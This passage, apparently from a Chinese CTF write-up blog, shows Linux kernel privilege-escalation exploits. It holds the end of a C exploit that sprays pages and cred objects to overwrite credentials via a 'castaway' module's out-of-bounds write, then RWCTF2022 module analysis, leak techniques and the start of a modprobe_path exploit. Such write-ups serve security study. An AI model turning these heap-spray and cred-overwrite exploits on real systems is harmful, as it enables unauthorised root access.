pages, return the socket fd */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_socket_and_alloc_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd, version;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,</span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">    err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">    err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of allocation to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_page</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">            .idx = idx,</span><br><span class="line">            .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">            .size = size,</span><br><span class="line">            .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of freeing to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_page</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">            .idx = idx,</span><br><span class="line">            .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the child, handler for commands from the pipe */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cmd_handler</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init pgv-exploit subsystem :) */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_system</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/castaway&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to open castaway device!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    prepare_pgv_system();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make buddy&#x27;s lower order clean, castaway_requesting from higher */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spraying pgv pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, getpagesize(), <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at no.%d socket\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to spray pages via socket!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free pages for cred */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for cred pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>) &#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray cred to get the isolate pages we released before */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spraying cred...&quot;</span>);</span><br><span class="line">    pipe(check_root_pipe);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CRED_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, waiting_for_root_fn) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at cloning %d child\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to clone()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free pages for our vulerable objects */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for vulnerable pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>) &#123;</span><br><span class="line">        free_page(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray vulnerable objects, hope that we can make an oob-write to cred */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring vulnerability in castaway kernel module...&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">uint32_t</span> *) &amp;buf[VUL_OBJ_SIZE - <span class="number">6</span>] = <span class="number">1</span>;    <span class="comment">/* cred-&gt;usage */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; VUL_OBJ_NUM; i++) &#123;</span><br><span class="line">        alloc();</span><br><span class="line">        edit(i, VUL_OBJ_SIZE, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* checking privilege in child processes */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] notifying child processes and waiting...&quot;</span>);</span><br><span class="line">    write(check_root_pipe[<span class="number">1</span>], buf, CRED_SPRAY_NUM);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">100000000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="D-3CTF2023-d3kcache"><a href="#D-3CTF2023-d3kcache" class="headerlink" title="D^3CTF2023 d3kcache"></a>D^3CTF2023 d3kcache</h2><h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><h3 id="利用思路-24"><a href="#利用思路-24" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><h2 id="RWCTF2022-Digging-into-kernel-1-2"><a href="#RWCTF2022-Digging-into-kernel-1-2" class="headerlink" title="RWCTF2022 Digging into kernel 1 &amp; 2"></a>RWCTF2022 Digging into kernel 1 &amp; 2</h2><h3 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h3><p><strong>start.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -initrd rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet noapic kalsr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -monitor null \</span><br><span class="line">    --nographic \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure></div>

<p><strong>逆向分析</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">xkmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  kmem_cache *v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_1E4);</span><br><span class="line">  misc_register(&amp;xkmod_device);</span><br><span class="line">  v0 = (kmem_cache *)kmem_cache_create(<span class="string">&quot;lalala&quot;</span>, <span class="number">192LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  s = v0;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">xkmod_release</span><span class="params">(inode *inode, file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> kmem_cache_free(s, buf); <span class="comment">// maybe double free</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">xkmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 data; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">                                                <span class="comment">// v3 __ : 0x8 rsp + 0x0</span></span><br><span class="line">                                                <span class="comment">// v4 __ : 0x4 rsp + 0x8</span></span><br><span class="line">                                                <span class="comment">// v5 __ : 0x4 rsp + 0xc</span></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;data, a3, <span class="number">0x10</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x6666666</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; size &lt;= <span class="number">0x50</span> &amp;&amp; idx &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user((<span class="type">char</span> *)buf + (<span class="type">int</span>)idx, data, (<span class="type">int</span>)size);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">0x7777777</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x1111111</span> )</span><br><span class="line">          buf = (<span class="type">void</span> *)kmem_cache_alloc(s, <span class="number">0xCC0</span>LL);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; size &lt;= <span class="number">0x50</span> &amp;&amp; idx &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ((<span class="type">void</span> (__fastcall *)(__int64, <span class="type">char</span> *, <span class="type">int</span>))copy_to_user)(data, (<span class="type">char</span> *)buf + (<span class="type">int</span>)idx, size);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xkmod_ioctl_cold();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-25"><a href="#利用思路-25" class="headerlink" title="利用思路"></a>利用思路</h3><p>关于内核基址获取，在内核堆基址（<code>page_offset_base</code>） + 0x9d000 处存放着 <code>secondary_startup_64</code> 函数的地址，而我们可以从 <code>free object</code> 的 <code>next</code> 指针获得一个堆上地址，从而去找堆的基址，之后分配到一个<code>堆基址 + 0x9d000</code> 处的 <code>object</code> 以泄露内核基址，这个地址前面刚好有一片为 NULL 的区域方便我们分配。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __PAGE_OFFSET           page_offset_base</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_OFFSET		((unsigned long)__PAGE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __va(x)			((void *)((unsigned long)(x)+PAGE_OFFSET))</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Must be perfomed *after* relocation. */</span></span><br><span class="line">	trampoline_header = (<span class="keyword">struct</span> trampoline_header *)</span><br><span class="line">		__va(real_mode_header-&gt;trampoline_header);</span><br><span class="line">	...</span><br><span class="line">	trampoline_header-&gt;start = (u64) secondary_startup_64;</span><br><span class="line">[......]</span><br><span class="line"><span class="comment">// vmlinux 查找 secondary_startup_64 基址</span></span><br><span class="line">.text:FFFFFFFF81000030 ; <span class="type">void</span> <span class="title function_">secondary_startup_64</span><span class="params">()</span></span><br><span class="line">[......]</span><br><span class="line">pwndbg&gt;x/40<span class="title function_">gx</span> <span class="params">(<span class="number">0xffff9f5d40000000</span>+<span class="number">0x9d000</span><span class="number">-0x20</span></span></span><br><span class="line"><span class="params"><span class="number">0xffff9f5d4009cfe0</span>: <span class="number">0X0000000000000000</span> <span class="number">0X0000000000000000</span></span></span><br><span class="line"><span class="params"><span class="number">0xffff9f5d4009cff0</span>: <span class="number">0X0000000000000000</span> <span class="number">0X0000000005c0c067</span></span></span><br><span class="line"><span class="params"><span class="number">0xffff9f5d4009d000</span>: <span class="number">0xffffffff97c00030</span> <span class="number">0X0000000000000901</span></span></span><br><span class="line"><span class="params"><span class="number">0xffff9f5d4009d010</span>: <span class="number">0X00000000000006b0</span> <span class="number">0X0000000000000000</span></span></span><br><span class="line"><span class="params"><span class="number">0xffff9f5d4009d020</span>: <span class="number">0X0000000000000000</span> <span class="number">0X0000000000000000</span></span></span><br></pre></td></tr></table></figure></div>

<p>至于 <code>page_offset_base</code> 可以通过 <code>object</code> 上的 <code>free list</code> 泄露的堆地址与上 <code>0xFFFFFFFFF0000000</code> 获取。不同版本可查看<code>vmmap</code>。</p>
<h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xFFFFFFFF82444700</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        